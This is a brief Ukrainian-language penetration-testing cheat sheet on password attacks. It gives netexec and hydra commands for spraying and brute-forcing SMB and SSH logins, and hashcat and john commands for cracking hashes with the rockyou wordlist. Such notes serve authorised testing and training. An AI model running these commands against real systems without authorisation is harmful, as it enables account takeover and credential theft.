# Password Attacks

## Спрей / брут сервісів
```bash
nxc smb <IP> -u users.txt -p 'Welcome1' --continue-on-success
hydra -L users.txt -P pass.txt ssh://<IP>
```
## Хеші
```bash
hashcat -m <mode> hashes.txt rockyou.txt
john --wordlist=rockyou.txt hash.txt
```
**Зв'язки:** [[Credentials]] · [[Kerberoast-ASREP]]
